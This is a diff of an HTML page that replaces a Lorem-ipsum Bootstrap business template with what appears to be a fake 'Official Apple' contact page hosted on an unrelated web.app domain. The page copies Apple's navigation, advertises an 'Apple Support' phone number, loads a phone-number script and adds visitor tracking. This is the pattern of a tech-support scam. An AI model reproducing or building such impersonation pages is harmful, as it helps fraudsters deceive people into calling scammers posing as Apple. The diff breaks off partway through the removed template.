@@ -1,10 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-	 <!-- Histats.com  START  (aync)-->
+  
+   <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5021250,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,5021731,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -12,963 +11,365 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5021250&101" alt="free tracking" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5021731&101" alt="free webpage hit counter" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-  <!--====== Required meta tags ======-->
-  <meta charset="utf-8" />
-  <meta http-equiv="x-ua-compatible" content="ie=edge" />
-  <meta name="description" content="" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-  <!--====== Title ======-->
-  <title>Business | Bootstrap 5 Business Template</title>
-
-  <!--====== Favicon Icon ======-->
-  <link rel="shortcut icon" href="../assets/images/favicon.svg" type="image/svg" />
-
-  <!--====== Bootstrap css ======-->
-  <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
-
-  <!--====== Line Icons css ======-->
-  <link rel="stylesheet" href="assets/css/lineicons.css" />
-
-  <!--====== Tiny Slider css ======-->
-  <link rel="stylesheet" href="assets/css/tiny-slider.css" />
-
-  <!--====== gLightBox css ======-->
-  <link rel="stylesheet" href="assets/css/glightbox.min.css" />
-
-  <link rel="stylesheet" href="style.css" />
 </head>
 
 <body>
-
-  <!--====== NAVBAR NINE PART START ======-->
-
-  <section class="navbar-area navbar-nine">
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-12">
-          <nav class="navbar navbar-expand-lg">
-            <a class="navbar-brand" href="index.html">
-              <img src="assets/images/white-logo.svg" alt="Logo" />
-            </a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNine"
-              aria-controls="navbarNine" aria-expanded="false" aria-label="Toggle navigation">
-              <span class="toggler-icon"></span>
-              <span class="toggler-icon"></span>
-              <span class="toggler-icon"></span>
-            </button>
-
-            <div class="collapse navbar-collapse sub-menu-bar" id="navbarNine">
-              <ul class="navbar-nav me-auto">
-                <li class="nav-item">
-                  <a class="page-scroll active" href="#hero-area">Home</a>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
                 </li>
-                <li class="nav-item">
-                  <a class="page-scroll" href="#services">Services</a>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
                 </li>
-
-                <li class="nav-item">
-                  <a class="page-scroll" href="#pricing">Pricing</a>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                 </li>
-                <li class="nav-item">
-                  <a class="page-scroll" href="#contact">Contact</a>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
                 </li>
-              </ul>
-            </div>
-
-            <div class="navbar-btn d-none d-lg-inline-block">
-              <a class="menu-bar" href="#side-menu-left"><i class="lni lni-menu"></i></a>
-            </div>
-          </nav>
-          <!-- navbar -->
-        </div>
-      </div>
-      <!-- row -->
-    </div>
-    <!-- container -->
-  </section>
-
-  <!--====== NAVBAR NINE PART ENDS ======-->
-
-  <!--====== SIDEBAR PART START ======-->
-
-  <div class="sidebar-left">
-    <div class="sidebar-close">
-      <a class="close" href="#close"><i class="lni lni-close"></i></a>
-    </div>
-    <div class="sidebar-content">
-      <div class="sidebar-logo">
-        <a href="index.html"><img src="assets/images/logo.svg" alt="Logo" /></a>
-      </div>
-      <p class="text">Lorem ipsum dolor sit amet adipisicing elit. Sapiente fuga nisi rerum iusto intro.</p>
-      <!-- logo -->
-      <div class="sidebar-menu">
-        <h5 class="menu-title">Quick Links</h5>
-        <ul>
-          <li><a href="javascript:void(0)">About Us</a></li>
-          <li><a href="javascript:void(0)">Our Team</a></li>
-          <li><a href="javascript:void(0)">Latest News</a></li>
-          <li><a href="javascript:void(0)">Contact Us</a></li>
-        </ul>
-      </div>
-      <!-- menu -->
-      <div class="sidebar-social align-items-center justify-content-center">
-        <h5 class="social-title">Follow Us On</h5>
-        <ul>
-          <li>
-            <a href="javascript:void(0)"><i class="lni lni-facebook-filled"></i></a>
-          </li>
-          <li>
-            <a href="javascript:void(0)"><i class="lni lni-twitter-original"></i></a>
-          </li>
-          <li>
-            <a href="javascript:void(0)"><i class="lni lni-linkedin-original"></i></a>
-          </li>
-          <li>
-            <a href="javascript:void(0)"><i class="lni lni-youtube"></i></a>
-          </li>
-        </ul>
-      </div>
-      <!-- sidebar social -->
-    </div>
-    <!-- content -->
-  </div>
-  <div class="overlay-left"></div>
-
-  <!--====== SIDEBAR PART ENDS ======-->
-
-  <!-- Start header Area -->
-  <section id="hero-area" class="header-area header-eight">
-    <div class="container">
-      <div class="row align-items-center">
-        <div class="col-lg-6 col-md-12 col-12">
-          <div class="header-content">
-            <h1>Corporate & Business Site Template by Ayro UI.</h1>
-            <p>
-              We are a digital agency that helps brands to achieve their
-              business outcomes. We see technology as a tool to create amazing
-              things.
-            </p>
-            <div class="button">
-              <a href="javascript:void(0)" class="btn primary-btn">Get Started</a>
-              <a href="https://www.youtube.com/watch?v=r44RKWyfcFw&fbclid=IwAR21beSJORalzmzokxDRcGfkZA1AtRTE__l5N4r09HcGS5Y6vOluyouM9EM"
-                class="glightbox video-button">
-                <span class="btn icon-btn rounded-full">
-                  <i class="lni lni-play"></i>
-                </span>
-                <span class="text">Watch Intro</span>
-              </a>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-6 col-md-12 col-12">
-          <div class="header-image">
-            <img src="assets/images/header/hero-image.jpg" alt="#" />
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <!-- End header Area -->
-
-  <!--====== ABOUT FIVE PART START ======-->
-
-  <section class="about-area about-five">
-    <div class="container">
-      <div class="row align-items-center">
-        <div class="col-lg-6 col-12">
-          <div class="about-image-five">
-            <svg class="shape" width="106" height="134" viewBox="0 0 106 134" fill="none"
-              xmlns="http://www.w3.org/2000/svg">
-              <circle cx="1.66654" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="1.66654" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="16.3333" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="16.3333" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="16.3333" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="16.3333" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="16.333" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="30.9998" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6665" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="30.9998" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6665" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="30.9998" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6665" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="30.9998" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6665" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="31" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="74.6668" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="45.6665" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="89.3333" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="60.3333" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="1.66679" r="1.66667" fill="#DADADA" />
-              <circle cx="60.3333" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="16.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="60.3333" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="31.0001" r="1.66667" fill="#DADADA" />
-              <circle cx="60.3333" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="45.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="60.3335" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="88.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="117.667" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="74.6668" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="103" r="1.66667" fill="#DADADA" />
-              <circle cx="60.333" cy="132" r="1.66667" fill="#DADADA" />
-              <circle cx="104" cy="132" r="1.66667" fill="#DADADA" />
-            </svg>
-            <img src="assets/images/about/about-img1.jpg" alt="about" />
-          </div>
-        </div>
-        <div class="col-lg-6 col-12">
-          <div class="about-five-content">
-            <h6 class="small-title text-lg">OUR STORY</h6>
-            <h2 class="main-title fw-bold">Our team comes with the experience and knowledge</h2>
-            <div class="about-five-tab">
-              <nav>
-                <div class="nav nav-tabs" id="nav-tab" role="tablist">
-                  <button class="nav-link active" id="nav-who-tab" data-bs-toggle="tab" data-bs-target="#nav-who"
-                    type="button" role="tab" aria-controls="nav-who" aria-selected="true">Who We Are</button>
-                  <button class="nav-link" id="nav-vision-tab" data-bs-toggle="tab" data-bs-target="#nav-vision"
-                    type="button" role="tab" aria-controls="nav-vision" aria-selected="false">our Vision</button>
-                  <button class="nav-link" id="nav-history-tab" data-bs-toggle="tab" data-bs-target="#nav-history"
-                    type="button" role="tab" aria-controls="nav-history" aria-selected="false">our History</button>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
                 </div>
-              </nav>
-              <div class="tab-content" id="nav-tabContent">
-                <div class="tab-pane fade show active" id="nav-who" role="tabpanel" aria-labelledby="nav-who-tab">
-                  <p>It is a long established fact that a reader will be distracted by the readable content of a page
-                    when
-                    looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal
-                    distribution of letters, look like readable English.</p>
-                  <p>There are many variations of passages of Lorem Ipsum available, but the majority have in some
-                    form,
-                    by injected humour.</p>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
                 </div>
-                <div class="tab-pane fade" id="nav-vision" role="tabpanel" aria-labelledby="nav-vision-tab">
-                  <p>It is a long established fact that a reader will be distracted by the readable content of a page
-                    when
-                    looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal
-                    distribution of letters, look like readable English.</p>
-                  <p>There are many variations of passages of Lorem Ipsum available, but the majority have in some
-                    form,
-                    by injected humour.</p>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
                 </div>
-                <div class="tab-pane fade" id="nav-history" role="tabpanel" aria-labelledby="nav-history-tab">
-                  <p>It is a long established fact that a reader will be distracted by the readable content of a page
-                    when
-                    looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal
-                    distribution of letters, look like readable English.</p>
-                  <p>There are many variations of passages of Lorem Ipsum available, but the majority have in some
-                    form,
-                    by injected humour.</p>
-                </div>
-              </div>
-            </div>
-          </div>
+            </aside>
         </div>
-      </div>
-    </div>
-    <!-- container -->
-  </section>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!--====== ABOUT FIVE PART ENDS ======-->
-
-  <!-- ===== service-area start ===== -->
-  <section id="services" class="services-area services-eight">
-    <!--======  Start Section Title Five ======-->
-    <div class="section-title-five">
-      <div class="container">
-        <div class="row">
-          <div class="col-12">
-            <div class="content">
-              <h6>Services</h6>
-              <h2 class="fw-bold">Our Best Services</h2>
-              <p>
-                There are many variations of passages of Lorem Ipsum available,
-                but the majority have suffered alteration in some form.
-              </p>
-            </div>
-          </div>
-        </div>
-        <!-- row -->
-      </div>
-      <!-- container -->
-    </div>
-    <!--======  End Section Title Five ======-->
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-capsule"></i>
-            </div>
-            <div class="service-content">
-              <h4>Refreshing Design</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-bootstrap"></i>
-            </div>
-            <div class="service-content">
-              <h4>Solid Bootstrap 5</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-shortcode"></i>
-            </div>
-            <div class="service-content">
-              <h4>100+ Components</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-dashboard"></i>
-            </div>
-            <div class="service-content">
-              <h4>Speed Optimized</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-layers"></i>
-            </div>
-            <div class="service-content">
-              <h4>Fully Customizable</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6">
-          <div class="single-services">
-            <div class="service-icon">
-              <i class="lni lni-reload"></i>
-            </div>
-            <div class="service-content">
-              <h4>Regular Updates</h4>
-              <p>
-                Lorem ipsum dolor sit amet, adipscing elitr, sed diam nonumy
-                eirmod tempor ividunt labor dolore magna.
-              </p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <!-- ===== service-area end ===== -->
-
-
-  <!-- Start Pricing  Area -->
-  <section id="pricing" class="pricing-area pricing-fourteen">
-    <!--======  Start Section Title Five ======-->
-    <div class="section-title-five">
-      <div class="container">
-        <div class="row">
-          <div class="col-12">
-            <div class="content">
-              <h6>Pricing</h6>
-              <h2 class="fw-bold">Pricing & Plans</h2>
-              <p>
-                There are many variations of passages of Lorem Ipsum available,
-                but the majority have suffered alteration in some form.
-              </p>
-            </div>
-          </div>
-        </div>
-        <!-- row -->
-      </div>
-      <!-- container -->
-    </div>
-    <!--======  End Section Title Five ======-->
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-4 col-md-6 col-12">
-          <div class="pricing-style-fourteen">
-            <div class="table-head">
-              <h6 class="title">Starter</h4>
-                <p>Lorem Ipsum is simply dummy text of the printing and industry.</p>
-                <div class="price">
-                  <h2 class="amount">
-                    <span class="currency">$</span>0<span class="duration">/mo </span>
-                  </h2>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-449-3831 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-
-            <div class="light-rounded-buttons">
-              <a href="javascript:void(0)" class="btn primary-btn-outline">
-                Start free trial
-              </a>
-            </div>
-
-            <div class="table-content">
-              <ul class="table-list">
-                <li> <i class="lni lni-checkmark-circle"></i> Cras justo odio.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Dapibus ac facilisis in.</li>
-                <li> <i class="lni lni-checkmark-circle deactive"></i> Morbi leo risus.</li>
-                <li> <i class="lni lni-checkmark-circle deactive"></i> Excepteur sint occaecat velit.</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6 col-12">
-          <div class="pricing-style-fourteen middle">
-            <div class="table-head">
-              <h6 class="title">Exclusive</h4>
-                <p>Lorem Ipsum is simply dummy text of the printing and industry.</p>
-                <div class="price">
-                  <h2 class="amount">
-                    <span class="currency">$</span>99<span class="duration">/mo </span>
-                  </h2>
-                </div>
-            </div>
-
-            <div class="light-rounded-buttons">
-              <a href="javascript:void(0)" class="btn primary-btn">
-                Start free trial
-              </a>
-            </div>
-
-            <div class="table-content">
-              <ul class="table-list">
-                <li> <i class="lni lni-checkmark-circle"></i> Cras justo odio.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Dapibus ac facilisis in.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Morbi leo risus.</li>
-                <li> <i class="lni lni-checkmark-circle deactive"></i> Excepteur sint occaecat velit.</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-        <div class="col-lg-4 col-md-6 col-12">
-          <div class="pricing-style-fourteen">
-            <div class="table-head">
-              <h6 class="title">Premium</h4>
-                <p>Lorem Ipsum is simply dummy text of the printing and industry.</p>
-                <div class="price">
-                  <h2 class="amount">
-                    <span class="currency">$</span>150<span class="duration">/mo </span>
-                  </h2>
-                </div>
-            </div>
-
-            <div class="light-rounded-buttons">
-              <a href="javascript:void(0)" class="btn primary-btn-outline">
-                Start free trial
-              </a>
-            </div>
-
-            <div class="table-content">
-              <ul class="table-list">
-                <li> <i class="lni lni-checkmark-circle"></i> Cras justo odio.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Dapibus ac facilisis in.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Morbi leo risus.</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Excepteur sint occaecat velit.</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <!--/ End Pricing  Area -->
-
-
-
-  <!-- Start Cta Area -->
-  <section id="call-action" class="call-action">
-    <div class="container">
-      <div class="row justify-content-center">
-        <div class="col-xxl-6 col-xl-7 col-lg-8 col-md-9">
-          <div class="inner-content">
-            <h2>We love to make perfect <br />solutions for your business</h2>
-            <p>
-              Why I say old chap that is, spiffing off his nut cor blimey
-              guvnords geeza<br />
-              bloke knees up bobby, sloshed arse William cack Richard. Bloke
-              fanny around chesed of bum bag old lost the pilot say there
-              spiffing off his nut.
-            </p>
-            <div class="light-rounded-buttons">
-              <a href="javascript:void(0)" class="btn primary-btn-outline">Get Started</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <!-- End Cta Area -->
-
-
-
-  <!-- Start Latest News Area -->
-  <div id="blog" class="latest-news-area section">
-    <!--======  Start Section Title Five ======-->
-    <div class="section-title-five">
-      <div class="container">
-        <div class="row">
-          <div class="col-12">
-            <div class="content">
-              <h6>latest news</h6>
-              <h2 class="fw-bold">Latest News & Blog</h2>
-              <p>
-                There are many variations of passages of Lorem Ipsum available,
-                but the majority have suffered alteration in some form.
-              </p>
-            </div>
-          </div>
-        </div>
-        <!-- row -->
-      </div>
-      <!-- container -->
-    </div>
-    <!--======  End Section Title Five ======-->
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-4 col-md-6 col-12">
-          <!-- Single News -->
-          <div class="single-news">
-            <div class="image">
-              <a href="javascript:void(0)"><img class="thumb" src="assets/images/blog/1.jpg" alt="Blog" /></a>
-              <div class="meta-details">
-                <img class="thumb" src="assets/images/blog/b6.jpg" alt="Author" />
-                <span>BY TIM NORTON</span>
-              </div>
-            </div>
-            <div class="content-body">
-              <h4 class="title">
-                <a href="javascript:void(0)"> Make your team a Design driven company </a>
-              </h4>
-              <p>
-                Lorem Ipsum is simply dummy text of the printing and
